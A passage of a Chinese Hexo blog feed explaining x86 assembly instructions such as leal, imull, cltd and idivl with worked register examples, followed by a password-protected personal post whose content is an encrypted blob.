<h3 id="leal指令"><a href="#leal指令" class="headerlink" title="leal指令"></a>leal指令</h3><p>leal指令是非常神奇的一个指令，它可以取一个存储器操作数的地址，并且将其赋给目的操作数。如果用C语言当中来对应的话，它就相当于&amp;运算。</p>
<p>比如对于<code>leal 4(%edx,%edx,4),%eax</code>这条指令来讲，我们假设<code>%edx</code>寄存器的值为x的话，那么这条指令的作用就是将<code>4 + x + 4x = 5x + 4</code>赋给<code>%eax</code>寄存器。它和<code>mov指令</code>的区别就在于，假设是<code>movl 4(%edx,%edx,4),%eax</code>这个指令，它的作用是将内存地址为<code>5x+4</code>的内存区域的值赋给<code>%eax</code>寄存器，而<code>leal指令</code>只是将5x+4这个地址赋给目的操<code>作数%eax</code>而已，它并不对存储器进行引用的值的计算。</p>
<p><img src="/images/汇编-14.png" alt="leal指令"></p>
<p>可以看到，此时在存储器中，地址为5x+4的区域的值为1000。那么此时若是进行movl 4(%edx,%edx,4),%eax操作，很显然，%eax的值应该为1000，也就是下图。</p>
<p><img src="/images/汇编-15.png" alt="leal指令"></p>
<p>但是如果进行leal 4(%edx,%edx,4),%eax操作的话，%eax的值就不是1000了，因为leal指令不会去取存储器当中的值，因此寄存器%eax的值应该是5x+4。</p>
<p><img src="/images/汇编-16.png" alt="leal指令"></p>
<p>试想一下，倘若在地址为5x+4的位置存储的是变量i，那么其实这条指令就相当于&amp;i操作，这也就是C语言当中的&amp;取地址操作的汇编级做法。</p>
<h3 id="特殊的算术操作指令"><a href="#特殊的算术操作指令" class="headerlink" title="特殊的算术操作指令"></a>特殊的算术操作指令</h3><p>不难发现这张图的指令跟上面的指令有点类似，不过下面的指令有点特殊：<strong>这些指令可以让只有32位的寄存器存储64位的数据</strong>。</p>
<p><img src="/images/汇编-17.png" alt="特殊的算术操作指令"></p>
<h3 id="imull、mull指令"><a href="#imull、mull指令" class="headerlink" title="imull、mull指令"></a>imull、mull指令</h3><p>这两个指令一看就是双胞胎，它们一个负责有符号全64位乘法，一个负责无符号全64位乘法。不难发现，imull这个指令好像是负责乘法的指令，而且在之前的乘法并没有区分有符号和无符号，现在怎么又成双胞胎指令了。</p>
<p>上张图中出现的指令是<code>IMUL指令</code>，当它操作双字的时候，也就是<code>imull指令</code>。不过不同的是，它的一般形式是<code>imull S D</code>，这里有两个操作数，它将计算S和D的乘积并截断为双字，然后存储在D当中。由于在截断时，无符号以及有符号的二进制序列是一样的，因此此处的乘法指令并不区分有符号和无符号。</p>
<p>现在我们讨论的<code>imull指令</code>，则与上面的普通乘法指令稍有不同，它只有一个操作数，也就是说，它的一般形式为<code>imull S</code>，这点在图片中也能看出来，而另外一个操作数默认为<code>%eax寄存器</code>。最终的结果，会将高32位存入%edx寄存器，而低32位存入%eax寄存器。</p>
<p>试想一下，如果我们只取%eax寄存器当中的32位结果，那其实这里计算的结果就是S*%eax，此时<code>imull S</code>的作用就与<code>imul S D</code>是一样的，只是目的操作数被固定为%eax罢了。</p>
<p>接下来我们看一个简单的示例，我们去看下指令<code>imull $0x3</code>的结果，我们假设此时<code>%eax</code>寄存器的值为<code>0x82345600</code>。也就是我们需要计算<code>0x3*0x82345600</code>的值，十六进制结果为<code>0xFFFF FFFE 869D 0200</code>。这个结果为64位的，因此我们寄存器的前后状态如下所示。</p>
<p><img src="/images/汇编-18.png" alt="imull指令"></p>
<p>可以看到，%eax保存着低32位的结果，单说这32位的话，它的有符号数值为-2036530688，正是我们直接计算0x3*0x82345600的32位截断后的有符号值，显然这个结果溢出了。如果组合上高32位，则结果为-6331497984，将它加上或者取模4294967296（2的32次方）将得到我们32位的结果。这里的有符号乘法采取的是先符号扩展被乘数，然后两者相乘，将结果再截断为64位所得。</p>
<p>对于mull的单操作数指令来讲，就比较简单了，它采用的是无符号乘法，因此就和我们平时的十进制乘法运算类似，只是同样的，它也会将结果的高32位存入%edx，将低32位存入%eax。</p>
<h3 id="cltd指令"><a href="#cltd指令" class="headerlink" title="cltd指令"></a>cltd指令</h3><p>这个指令相对来说就非常简单了，它就是简单的将%eax寄存器的值符号扩展32位到%edx寄存器，也就是说，如果%eax寄存器的二进制序列的最高位为0，则cltd指令将把%edx置为32个0，相反，如果%eax寄存器的二进制序列最高位为1，则cltd指令将会自从填充%edx寄存器为32个1。</p>
<h3 id="idivl、divl指令"><a href="#idivl、divl指令" class="headerlink" title="idivl、divl指令"></a>idivl、divl指令</h3><p>这两个指令与前面的imull以及mull类似，它也将计算结果存放在两个寄存器当中，其中余数存放在%edx寄存器，商存放在%eax寄存器。如果各位理解了前面的imull以及mull，那么这里idivl和divl理解起来会非常简单。</p>
<p>这里举一个简单的例子，考虑指令<code>idivl $0x3</code>的结果，我们假设此时%eax寄存器的值为<code>0x82345600</code>。也就是我们需要计算0x82345600/0x3的值，商为0xD6117200，余数为0x0。因此我们寄存器的前后状态如下所示。</p>
<p><img src="/images/汇编-19.png" alt="idivl指令"></p>
<p>可以看到，在idivl这个指令执行的过程中，其实对被除数进行了符号扩展，类似于cltd指令，或者有时也会将%eax移动到%edx，然后对%edx进行算术右移31位的运算。这两种方式的结果是一样的，都是将%eax符号扩展32位并存储在%edx当中。</p>
<p><a href="http://www.cnblogs.com/zuoxiaolong/p/computer16.html" target="_blank" rel="external">深入理解计算机系统（3.4）—算数与逻辑运算指令详解</a><br><a href="http://www.cnblogs.com/zuoxiaolong/p/computer17.html" target="_blank" rel="external">深入理解计算机系统（3.5）—特殊的算术操作指令详解</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;算术与逻辑运算指令&quot;&gt;&lt;a href=&quot;#算术与逻辑运算指令&quot; class=&quot;headerlink&quot; title=&quot;算术与逻辑运算指令&quot;&gt;&lt;/a&gt;算术与逻辑运算指令&lt;/h3&gt;&lt;p&gt;算术与逻辑运算包括很多种，估计各位猿友也能很快的想出来，比如最常见的加减乘除、与或非
    
    </summary>
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/categories/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/tags/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>总结|我的大二下</title>
    <link href="http://yoursite.com/2018/05/07/%E6%80%BB%E7%BB%93-%E6%88%91%E7%9A%84%E5%A4%A7%E4%BA%8C%E4%B8%8B/"/>
    <id>http://yoursite.com/2018/05/07/总结-我的大二下/</id>
    <published>2018-05-06T19:39:25.000Z</published>
    <updated>2018-05-06T17:03:11.776Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <div id="security"> <div class="input-container"> <input type="password" class="form-control" id="pass" placeholder=" Welcome to my blog, enter password to read. " /> <label for="pass"> Welcome to my blog, enter password to read. </label> <div class="bottom-line"></div> </div> </div> <div id="encrypt-blog" style="display:none"> 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